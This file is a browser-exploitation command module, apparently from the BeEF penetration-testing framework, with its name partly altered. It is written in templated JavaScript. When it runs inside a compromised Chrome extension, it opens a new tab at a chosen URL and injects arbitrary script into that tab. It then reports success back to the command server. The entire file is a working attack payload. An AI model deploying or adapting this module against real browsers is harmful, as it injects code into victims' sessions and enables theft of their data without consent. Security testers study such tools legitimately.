//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {
	try{
		chrome.tabs.create({url:"<%= @url %>"}, function(tab){
			chrome.tabs.executeScript(tab.id,{code:"<%= @theJS %>"}, function(){
               server.net.send('<%= @command_url %>', <%= @command_id %>, 'Code executed on tab.id: ' + tab.id);
            });
		});
	} catch(error){
		server.net.send('<%= @command_url %>', <%= @command_id %>, 'Not inside of a Chrome Extension');
	}
});

